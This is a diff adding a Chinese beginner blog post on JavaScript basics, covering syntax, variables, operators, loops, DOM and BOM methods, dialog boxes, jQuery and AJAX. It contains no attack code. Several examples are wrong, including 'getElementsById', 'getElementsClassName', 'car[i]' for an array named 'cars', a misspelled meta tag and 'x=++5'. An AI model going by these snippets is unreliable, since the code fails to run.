@@ -152,6 +152,2079 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-安全进阶/JavaScript代码进阶" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/">JavaScript代码进阶</a>
+    </h1>
+  
+
+        
+        <a href="/2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/" class="archive-article-date">
+  	<time datetime="2021-03-16T02:00:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="JavaScript简介"><a href="#JavaScript简介" class="headerlink" title="JavaScript简介"></a>JavaScript简介</h2><p>（1）JavaScript是web浏览器的语言，一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。</p>
+<p>（2）它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言。最早是在HTML网页上使用，用来给HTML网页增加动态功能。</p>
+<p>（3）JavaScript基本特点：</p>
+<ul>
+<li>脚本编写语言</li>
+<li>基于对象的语言</li>
+<li>简单性</li>
+<li>安全性</li>
+<li>动态性</li>
+<li>跨平台性</li>
+</ul>
+<h2 id="JavaScript的基本语法"><a href="#JavaScript的基本语法" class="headerlink" title="JavaScript的基本语法"></a>JavaScript的基本语法</h2><p>（1）JavaScript中的脚本必须位于&lt;script&gt;与&lt;/script&gt;标签之间。浏览器的控制台可以执行js代码。</p>
+<pre><code class="javascript">&lt;script type=&quot;text/javascript&quot; src=&quot;&quot;&gt;&lt;/script&gt;
+//外部引入js代码，src为资源路径</code></pre>
+<p>（2）脚本可被放置在HTML页面的&lt;body&gt;和&lt;head&gt;部分中。</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            document.write(&quot;&lt;h1&gt;this is a heading&lt;/h1&gt;&quot;);
+            document.write(&quot;&lt;p&gt;this is a paragraph&lt;/p&gt;&quot;);
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>（3）JavaScript的注释：</p>
+<ul>
+<li>单行注释：//</li>
+</ul>
+<pre><code class="javascript">&lt;script&gt;
+    //这表示单行注释，不会在页面中被显示
+    alert(&quot;my first javascript&quot;);
+&lt;/script&gt;</code></pre>
+<ul>
+<li>多行注释：/*在此写注释 */</li>
+</ul>
+<pre><code class="javascript">&lt;script&gt;
+    /*这表示多行注释，
+    不会在页面中被显示*/
+    alert(&quot;my first javascript&quot;);
+&lt;/script&gt;</code></pre>
+<h3 id="JavaScript变量"><a href="#JavaScript变量" class="headerlink" title="JavaScript变量"></a>JavaScript变量</h3><p>（1）变量是存储信息的容器；typeof(a)，打印a的类型</p>
+<pre><code class="javascript">var x=2;
+var y=3;
+var z=x+y;</code></pre>
+<p>（2）声明（创建）JavaScript变量</p>
+<ul>
+<li>方法一：创建变量，为变量赋值；</li>
+</ul>
+<pre><code class="javascript">var carname;
+carname=&quot;Volvo&quot;;</code></pre>
+<ul>
+<li>方法二：创建变量的同时并为变量赋值；</li>
+</ul>
+<pre><code class="javascript">var carname=&quot;Volvo&quot;;</code></pre>
+<p>（3）一条语句，多个变量：在一条语句中声明多个变量。语句使用var开头，使用逗号分隔变量；</p>
+<pre><code class="javascript">var name=&quot;Gates&quot;,age=56,job=&quot;CEO&quot;;</code></pre>
+<p>（4）横跨多行声明</p>
+<pre><code class="javascript">var name=&quot;Gates&quot;,
+    age=56,
+    job=&quot;CEO&quot;;</code></pre>
+<p>（5）无值变量：只声明了变量，但未为变量赋值，值=undefined</p>
+<pre><code class="javascript">var carname;</code></pre>
+<p>（6）重新声明变量：重新声明变量只要未重新赋值，变量原有的值不变，若重新赋值，则该变量的原有值被覆盖。</p>
+<pre><code class="javascript">var carname=&quot;Volvo&quot;; var carname;</code></pre>
+<h3 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h3><p>（1）局部变量：在JavaScript函数内部声明的变量（使用var）是局部变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。只要函数运行完毕，本地变量就会被删除。</p>
+<p>（2）全局变量：在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问它。全局变量会在页面关闭后被删除。</p>
+<p>（3）把值赋给尚未声明的变量，该变量将被自动作为全局变量声明。</p>
+<h3 id="JavaScript的基本数据类型"><a href="#JavaScript的基本数据类型" class="headerlink" title="JavaScript的基本数据类型"></a>JavaScript的基本数据类型</h3><p>（1）三种基本的数据类型：</p>
+<ul>
+<li>数值（整数和实数）</li>
+<li>字符串型（用’’或””括起来的字符或数值）</li>
+<li>布尔型（使用True或False表示）</li>
+</ul>
+<p>（2）常量：</p>
+<ul>
+<li>整型常量</li>
+<li>实型常量</li>
+<li>布尔值</li>
+<li>字符型常量</li>
+<li>空值</li>
+</ul>
+<p>（3）变量：由开发人员自行定义</p>
+<p>（4）JavaScript拥有动态类型，相同的变量可用作不同的类型</p>
+<pre><code class="javascript">var x; //x为undefined
+var x = 6; //x为数字
+var x = &quot;Bill&quot;; //x为字符串</code></pre>
+<p>（5）JavaScript字符串，可以使用单引号或双引号引用任意文本</p>
+<pre><code class="javascript">var carname=&quot;Bill Gates&quot;;
+var carname=&#39;Bill Gates&#39;;</code></pre>
+<p>（6）JavaScript字符串，允许在字符串中使用引号，只要不匹配字符中的引号即可</p>
+<pre><code class="javascript">var answer=&quot;He is called &#39;Bill&#39;&quot;;
+var answer=&#39;He is called &quot;Bill&quot;&#39;;
+var answer=&quot;&quot;\&#39;\&quot;Bill&quot;&#39;&quot;&quot;   //其中\表示转义符，结果为
+var answer=\\\&#39;        //结果为\&#39;
+
+var a=&#39;&quot;&#39;;
+var b=&quot;&#39;&quot;;
+var c=&quot;&lt;div&gt;&quot;;
+var d= a+b+c+b+a      //用加号作为连接符，结果为&quot;&#39;&lt;div&gt;&#39;&quot;
+
+var e=1+2          //结果e为3
+var f=1+&quot;2&quot;        //结果f为12
+var g=1+&quot;&quot;         //结果g为1，但typeof(g)为string</code></pre>
+<p>（7）JavaScript数字：JavaScript只有一种数字类型，数字可以带小数点，也可以不带</p>
+<pre><code class="javascript">var x1=34.00;
+var x2=34;</code></pre>
+<p>（8）极大或极小的数字可以通过科学（指数）计数法书写</p>
+<pre><code class="javascript">var x=123e5;  //12300000
+var y=123e-5; //0.00123</code></pre>
+<p>（9）JavaScript布尔，布尔（逻辑）只能有两个值：true或false</p>
+<pre><code class="javascript">var x=true
+var y=false</code></pre>
+<h3 id="JavaScript函数"><a href="#JavaScript函数" class="headerlink" title="JavaScript函数"></a>JavaScript函数</h3><p>（1）JavaScript函数语法。</p>
+<ul>
+<li>函数就是包裹在花括号中的代码块，前面使用了关键词function：</li>
+</ul>
+<pre><code class="JavaScript">function functionname()&#123;
+    这里是要执行的代码
+&#125;</code></pre>
+<ul>
+<li>调用带参数的函数，可以向其传递值，这些值被称为参数。</li>
+</ul>
+<pre><code class="javascript">myFunction(argument1,argument2)</code></pre>
+<ul>
+<li>当声明函数时，需要把参数作为变量来声明：</li>
+</ul>
+<pre><code class="JavaScript">function myFunction(var1,var2)&#123;
+    这里是要执行的代码
+&#125;</code></pre>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;p&gt;
+          请点击其中的一个按钮，来调用带参数的函数。  
+        &lt;/p&gt;
+        &lt;button onclick=&quot;myFunction(&#39;Harry Potter&#39;,&#39;Wizard&#39;)&quot;&gt;
+            点击这里
+        &lt;/button&gt;
+        &lt;button onclick=&quot;myFunction(&#39;Bob&#39;,&#39;Builder&#39;)&quot;&gt;
+            点击这里
+        &lt;/button&gt;
+
+        &lt;script&gt;
+            function myFunction(name,job)&#123;
+                alert(&quot;Welcome &quot;+name+&quot;,the &quot;+job);
+            &#125;
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>（2）使用函数将 值返回调用它的地方，通过使用return语句就可以实现，在使用return语句时，函数会停止执行，并返回指定的值。</p>
+<pre><code class="javascript">//带有返回值的函数语法
+function myFunction()&#123;
+var x=5;
+return x;
+&#125;</code></pre>
+<p>注意：整个JavaScript并不会停止执行，仅仅是函数。JavaScript将继续从调用函数的地方执行代码。</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;p&gt;
+            本例调用的函数会执行一个计算，然后返回结果：
+        &lt;/p&gt;
+        &lt;p id=&quot;demo&quot;&gt;
+        &lt;/p&gt;
+
+        &lt;script&gt;
+            function myFunction(a,b)&#123;
+                return a*b;
+            &#125;
+            document.getElementById(&quot;demo&quot;).innerHTML=myFunction(4,3);
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h3 id="JavaScript运算符"><a href="#JavaScript运算符" class="headerlink" title="JavaScript运算符"></a>JavaScript运算符</h3><h4 id="算术运算符与赋值运算符"><a href="#算术运算符与赋值运算符" class="headerlink" title="算术运算符与赋值运算符"></a>算术运算符与赋值运算符</h4><p>算术运算符用于执行变量或值之间的算术运算，赋值运算符用于给JavaScript变量赋值</p>
+<table>
+<thead>
+<tr>
+<th align="center">运算符</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">+</td>
+<td align="center">加</td>
+</tr>
+<tr>
+<td align="center">-</td>
+<td align="center">减</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="center">乘</td>
+</tr>
+<tr>
+<td align="center">/</td>
+<td align="center">除</td>
+</tr>
+<tr>
+<td align="center">%</td>
+<td align="center">取余（保留整数）</td>
+</tr>
+<tr>
+<td align="center">++</td>
+<td align="center">累加（x=++5，x=6）</td>
+</tr>
+<tr>
+<td align="center">–</td>
+<td align="center">递减（x=–5，x=4）</td>
+</tr>
+<tr>
+<td align="center">=</td>
+<td align="center">赋值x=y</td>
+</tr>
+<tr>
+<td align="center">+=</td>
+<td align="center">x+=y等价于x=x+y</td>
+</tr>
+<tr>
+<td align="center">-=</td>
+<td align="center">x-=y等价于x=x-y</td>
+</tr>
+<tr>
+<td align="center">*=</td>
+<td align="center">x*=y等价于x=x*y</td>
+</tr>
+<tr>
+<td align="center">/=</td>
+<td align="center">x/=y等价于x=x/y</td>
+</tr>
+<tr>
+<td align="center">%=</td>
+<td align="center">x%=y等价于x=x%y</td>
+</tr>
+</tbody></table>
+<h4 id="比较和逻辑运算符"><a href="#比较和逻辑运算符" class="headerlink" title="比较和逻辑运算符"></a>比较和逻辑运算符</h4><p>（1）比较运算符在逻辑语句中使用，以测定变量或值是否相等</p>
+<table>
+<thead>
+<tr>
+<th align="center">运算符</th>
+<th align="center">描述</th>
+<th align="center">例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">==</td>
+<td align="center">等于</td>
+<td align="center">5==8为false</td>
+</tr>
+<tr>
+<td align="center">===</td>
+<td align="center">全等(值和类型都要相等)</td>
+<td align="center">5===5为true，5===”5”为false</td>
+</tr>
+<tr>
+<td align="center">!=</td>
+<td align="center">不等于</td>
+<td align="center">5!=8为true</td>
+</tr>
+<tr>
+<td align="center">&gt;</td>
+<td align="center">大于</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">&lt;</td>
+<td align="center">小于</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">&gt;=</td>
+<td align="center">大于等于</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">&lt;=</td>
+<td align="center">小于等于</td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p>（2）逻辑运算符用于测定变量或值之间的逻辑</p>
+<table>
+<thead>
+<tr>
+<th align="center">运算符</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&amp;&amp;</td>
+<td align="center">and</td>
+</tr>
+<tr>
+<td align="center">||</td>
+<td align="center">or</td>
+</tr>
+<tr>
+<td align="center">!</td>
+<td align="center">not</td>
+</tr>
+</tbody></table>
+<h3 id="javascript条件语句"><a href="#javascript条件语句" class="headerlink" title="javascript条件语句"></a>javascript条件语句</h3><p>（1）if语句：只有当指定条件为true时，执行该条件下的代码</p>
+<p>（2）if…else语句：当条件为true时执行if下的代码，当条件为false时执行else下的代码</p>
+<p>（3）if…else if…else：使用该语句来选择多个代码块之一来执行</p>
+<p>（4）switch语句：使用该语句来选择多个代码块之一来执行</p>
+<h3 id="JavaScript循环语句"><a href="#JavaScript循环语句" class="headerlink" title="JavaScript循环语句"></a>JavaScript循环语句</h3><p>（1）for语句：</p>
+<pre><code>for(语句1;语句2;语句3)&#123;
+    被执行的代码块
+&#125;</code></pre>
+<ul>
+<li>语句1在循环开始前执行(可选)</li>
+<li>语句2定义循环的条件(可选)</li>
+<li>语句3在循环已被执行后执行(可选)</li>
+</ul>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            cars=[&quot;BMW&quot;,&quot;Volvo&quot;,&quot;Ford&quot;];
+            for(var i=0;i&lt;cars.length;i++)&#123;
+                document.write(car[i]+&quot;&lt;br&gt;&quot;);
+            &#125;
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>（2）while语句</p>
+<pre><code>while(条件)&#123;需要执行的代码&#125;
+例如：
+while(i&lt;5)&#123;
+x=x+&quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;
+i++;
+&#125;</code></pre>
+<p>（3）do…while语句</p>
+<pre><code>do&#123;
+需要执行的代码
+&#125;while(条件)</code></pre>
+<h3 id="break和continue语句"><a href="#break和continue语句" class="headerlink" title="break和continue语句"></a>break和continue语句</h3><p>（1）break语句：用于跳出当前循环，跳出循环后会继续执行该循环之后的代码。</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;p&gt;
+            点击按钮，测试带有break语句的循环
+        &lt;/p&gt;
+        &lt;button onclick=&quot;myFunction()&quot;&gt;
+            点击这里
+        &lt;/button&gt;
+        &lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;
+        &lt;script&gt;
+            function myFunction()&#123;
+                var x=&quot;&quot;,i=0;
+                for(i=0;i&lt;10;i++)&#123;
+                    if(i==3)&#123;
+                        break;
+                    &#125;
+                    x=x + &quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;
+                &#125;
+                document.getElementById(&quot;demo&quot;).innerHTML=x;
+            &#125;
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>（2）continue语句：中断循环中的迭代，若出现了指定的条件，然后继续循环中的下一个迭代。</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;p&gt;
+            点击按钮执行循环，循环会跳过i=3的步骤
+        &lt;/p&gt;
+        &lt;button onclick=&quot;myFunction()&quot;&gt;
+            点击这里
+        &lt;/button&gt;
+        &lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;
+        &lt;script&gt;
+            function myFunction()&#123;
+                var x=&quot;&quot;,i=0;
+                for(i=0;i&lt;10;i++)&#123;
+                    if(i==3)&#123;
+                        continue;
+                    &#125;
+                    x=x + &quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;
+                &#125;
+                document.getElementById(&quot;demo&quot;).innerHTML=x;
+            &#125;
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h2 id="JavaScript-DOM"><a href="#JavaScript-DOM" class="headerlink" title="JavaScript DOM"></a>JavaScript DOM</h2><p>（1）HTML DOM（文档对象模型）。对当前超文本进行操作的技术。当网页被加载时，浏览器会创建页面的文档对象模型，HTML DOM模型被构造为对象的树。</p>
+<p>（2）通过可编程的对象模型，JavaScript获得了足够的能力来创建动态的HTML。</p>
+<ul>
+<li>JavaScript能够改变页面中的所有HTML元素</li>
+<li>JavaScript能够改变页面中的所有HTML属性</li>
+<li>JavaScript能够改变页面中的所有CSS样式</li>
+<li>JavaScript能够对页面中的所有事件作出反应</li>
+</ul>
+<p>（3）通常要使用JavaScript操作HTML元素，就需要找到相应的元素，可通过如下的方法找到元素：</p>
+<ul>
+<li>通过id找到HTML元素</li>
+<li>通过标签名找到HTML元素</li>
+<li>通过类名找到HTML元素</li>
+</ul>
+<p>（4）DOM可以获取网站的cookie。在浏览器中使用快捷键F12进入控制台(console)，输入document.cookie就能获取当前网站的cookie。</p>
+<p><img src="https://i.loli.net/2021/03/16/acUeO5FTR7PVQX8.png" alt="image-20210316181503816"></p>
+<p>（5）DOM可以获取URL的数据，在控制台输入window.location就可获取到浏览器的URL数据</p>
+<p><img src="https://i.loli.net/2021/03/16/PhWa3QA9vnIHszN.png" alt="image-20210316181801514"></p>
+<h3 id="获取标签–基于id"><a href="#获取标签–基于id" class="headerlink" title="获取标签–基于id"></a>获取标签–基于id</h3><p>在使用JavaScript操作HTML元素，就需要找到相应的元素，可通过id获取元素</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meat charset=&quot;UTF-8&quot;&gt;&lt;/meat&gt;
+        &lt;title&gt;Goktech-javascript&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1 id=&quot;demo&quot;&gt;welcome to gok&lt;/h1&gt;
+        &lt;script&gt;
+            var a=document.getElementById(&quot;demo&quot;);
+            document.write(&quot;这是基于Id抓取到的内容：&quot;+a.innerHTML);   //document基于DOM技术，用到某一个方法要加上一个点.如getElementById函数，表示通过id找到一个标签。innerHTML可修改元素内容。window是基于BOM技术
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/16/UXLgYtdNaQ9b8AE.png" alt="image-20210316183426660"></p>
+<pre><code class="html">&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+    &lt;script&gt;
+        function test()&#123;
+            document.getElementsById(&quot;1&quot;).value=&quot;文本文档1&quot;; //找到id对应的标签后再用value方法修改改标签的值。
+            document.getElementsById(&quot;2&quot;).value=&quot;文本文档2&quot;;
+            document.getElementsById(&quot;3&quot;).href=&quot;http://www.goktech.cn&quot;;//找到id对应的标签后用href方法修改原a标签的值。
+        &#125;
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;1&quot; onclick=&quot;test()&quot;&gt;  //用onclick调用test函数
+    &lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;2&quot; onclick=&quot;test()&quot;&gt;
+    &lt;a href=&quot;www.baidu.com&quot; id=&quot;3&quot; onclick=&quot;test()&quot;&gt;百度&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/23/PA4lhXvJHSTzKNu.png" alt="image-20210323212113175"></p>
+<p><img src="https://i.loli.net/2021/03/23/kMUy4m59fQAOZY8.png" alt="image-20210323212208821"></p>
+<p><img src="https://i.loli.net/2021/03/23/uTtJAC1yasGLEgf.png" alt="image-20210323212231314"></p>
+<h3 id="获取标签-–基于class"><a href="#获取标签-–基于class" class="headerlink" title="获取标签 –基于class"></a>获取标签 –基于class</h3><pre><code class="javascript">document.getElementsClassName(&quot;&quot;)[0]   //由于类并不唯一，所以可以在末尾加上[0]代表要取第一个标签</code></pre>
+<h3 id="获取标签–基于Tagname"><a href="#获取标签–基于Tagname" class="headerlink" title="获取标签–基于Tagname"></a>获取标签–基于Tagname</h3><p>通过TagName获取元素；</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/meta&gt;
+        &lt;title&gt;Goktech-javascript&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;welcome to gok!&lt;/h1&gt;
+        &lt;h1&gt;Javascript DOM&lt;/h1&gt;
+        &lt;script&gt;
+            var b=document.getElementsByTagName(&quot;h1&quot;);
+            document.write(&quot;这是基于TagName抓取到的内容：&quot;+b[0].innerHTML);
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h3 id="获取标签–基于Div"><a href="#获取标签–基于Div" class="headerlink" title="获取标签–基于Div"></a>获取标签–基于Div</h3><p>通过Div获取元素</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/meta&gt;
+        &lt;title&gt;Goktech-javascript&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;div id=&quot;demo&quot;&gt;
+            &lt;h1&gt;welcome to gok!&lt;/h1&gt;
+            &lt;h1&gt;Javascript DOM&lt;/h1&gt;
+        &lt;/div&gt;
+
+        &lt;script&gt;
+            var a=document.getElementById(&quot;demo&quot;);
+            var b=document.getElementsByTagName(&quot;h1&quot;);
+            document.write(&quot;这是基于Div抓取到的内容：&quot;+b[0].innerHTML);
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h2 id="Javascript-BOM"><a href="#Javascript-BOM" class="headerlink" title="Javascript BOM"></a>Javascript BOM</h2><p>（1）BOM(Browser Object Model)，浏览器对象模型，对浏览器进行操作。它使JavaScript有能力与浏览器”对话“</p>
+<p>（2）所有浏览器都支持window对象。它表示浏览器窗口。</p>
+<ul>
+<li>所有JavaScript全局对象、函数以及变量均自动成为window对象的成员。</li>
+<li>全局变量是window对象的属性。</li>
+<li>全局函数是window对象的方法。</li>
+</ul>
+<p>（3）window.open()   ——-打开新窗口。window.close()  ——-关闭当前窗口。 window.location.href —-页面跳转。</p>
+<h3 id="BOM-window-open"><a href="#BOM-window-open" class="headerlink" title="BOM-window.open"></a>BOM-window.open</h3><p>window.open()实现的功能是打开一个新窗口，通过设置一个按钮，利用window.open()可以实现当点击按钮的时候，会打开一个新的页面(如例中的<a href="http://www.goktech.cn)，代码及现象如图：">http://www.goktech.cn)，代码及现象如图：</a></p>
+<pre><code class="html">&lt;html&gt;
+    &lt;head&gt;
+        &lt;script&gt;
+            function win_open()&#123;
+                window.open(&quot;http://www.goktech.cn&quot;)
+            &#125;
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;input type=&quot;button&quot; value=&quot;Open Window&quot; onclick=&quot;win_open()&quot;/&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/16/BwrX6UfFc4VMtxq.png" alt="image-20210316224229904"></p>
+<p><img src="https://i.loli.net/2021/03/16/suMivCgGxBAjZFD.png" alt="image-20210316224252251"></p>
+<h3 id="BOM-window-close"><a href="#BOM-window-close" class="headerlink" title="BOM-window.close"></a>BOM-window.close</h3><p>window.close()实现的功能是<strong>关闭当前窗口</strong>，在本例中预先设置执行代码后会弹出一个新窗口，当点击设置的按钮后，此新窗口会被关闭，代码及现象如图：</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;head&gt;
+        &lt;script type=&quot;text/javascript&quot;&gt;
+            function Winclose()&#123;
+                myWindow.close()
+            &#125;        
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;input type=&quot;button&quot; value=&quot;Close myWindow&quot; onclick=&quot;Winclose()&quot;/&gt;
+        &lt;script type=&quot;text/javascript&quot;&gt;
+            myWindow=window.open(&#39;&#39;,&#39;&#39;,&#39;width=200,height=100&#39;)
+            myWindow.document.write(&quot;这是一个示例窗口&quot;)
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/17/PfxMvwjTXaOmSqb.png" alt="image-20210317145808454"></p>
+<h3 id="Bom-window-location-href"><a href="#Bom-window-location-href" class="headerlink" title="Bom-window.location.href"></a>Bom-window.location.href</h3><p>（1）window.location可以查看当前网页的属性。</p>
+<p>（2）window.location.href()是修改当前网页的href属性，实现的功能是页面跳转，利用window.location.href()设置一个想要跳转的页面，当执行代码时就会跳转到相应的位置，代码及现象如下：</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Goktech.javascript&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        window.location.href=&#39;http://www.goktech.cn&#39;
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/17/AlFSoMRB8nvUTuZ.png" alt="image-20210317150437014"></p>
+<h3 id="BOM-消息框-alert"><a href="#BOM-消息框-alert" class="headerlink" title="BOM-消息框-alert"></a>BOM-消息框-alert</h3><p>alert(“文本”)：显示带有一段消息和一个确认按钮的警告框</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UFT-8&quot;&gt;
+        &lt;title&gt;Goktech.javascript&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(alert)&quot; onclick=&quot;alert(&#39;这是由alert形成的弹框&#39;)&quot;&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/17/4cmGoHKRihvekpQ.png" alt="image-20210317151009427"></p>
+<h3 id="BOM-消息框-confirm"><a href="#BOM-消息框-confirm" class="headerlink" title="BOM-消息框-confirm"></a>BOM-消息框-confirm</h3><p>confirm(“文本”)：显示带有一段消息以及确认按钮和取消按钮的对话框</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;title&gt;Goktech.javascript&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(confirm)&quot; onclick=&quot;confirm(&#39;这是由confirm形成的弹框&#39;)&quot;&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/17/w1kCMUD9ENZ4hma.png" alt="image-20210317151545748"></p>
+<h3 id="BOM-消息框-prompt"><a href="#BOM-消息框-prompt" class="headerlink" title="BOM-消息框-prompt"></a>BOM-消息框-prompt</h3><p>prompt(“文本”)：显示可提示用户输入的对话框</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;title&gt;Goktech-javascript&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(prompt)&quot; onclick=&quot;prompt(&#39;这是由prompt形成的弹框&#39;)&quot;&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/17/3GV4TCYS8IwcXoz.png" alt="image-20210317152036718"></p>
+<p>扩展：jQuery是一个JavaScript库，极大简化了JavaScript。</p>
+<pre><code>&lt;script src=&quot;jquery-3.4.1.js&quot;&gt;&lt;/script&gt;
+function Jquery_Test()&#123;
+    $(&quot;p&quot;)    //定位到p标签
+    $(&quot;#p1&quot;).html(&quot;test&quot;)   //找到到id为p1的元素，给它添加元素
+    $(&quot;#input1&quot;).val(&quot;123&quot;)
+&#125;</code></pre>
+<h2 id="AJAX的基本语法及应用"><a href="#AJAX的基本语法及应用" class="headerlink" title="AJAX的基本语法及应用"></a>AJAX的基本语法及应用</h2><p>（1）AJAX=Asynchronous JavScript and XML（异步的JavaScript和XML）</p>
+<p>（2）AJAX是一种用于创建快速动态网页的技术。AJAX不是一种新的语言，而是一种新的标准方法；</p>
+<p>（3）传统的网页（不使用AJAX）如果需要更新内容，必须重载整个网页。AJAX技术通过在后台与服务器进行少量数据交换，AJAX可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
+<p>（4）使用AJAX的应用程序案例：新浪微博、Google地图、开心网等等。</p>
+<p>HTML – AJAX – 访问服务器的某个页面 – 数据库</p>
+<h3 id="AJAX请求方法"><a href="#AJAX请求方法" class="headerlink" title="AJAX请求方法"></a>AJAX请求方法</h3><p>如需将请求发送到服务器，使用XMLHttpRequest类的open()和send()方法；</p>
+<pre><code class="javascript">xmlhttp.open(&quot;GET&quot;,&quot;test1.txt&quot;,true);
+xmlhttp.send();</code></pre>
+<table>
+<thead>
+<tr>
+<th align="left">open(method,url,async)</th>
+<th align="left">规定请求的类型、URL以及是否异步处理请求。                                                                                         (1)method：请求的类型GET或POST                                                                                (2)url：文件在服务器上的位置                                                                                             (3)async：true（异步）或false（同步）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">send(string)</td>
+<td align="left">将请求发送到服务器。                                                                                                            *string：仅用于POST请求</td>
+</tr>
+</tbody></table>
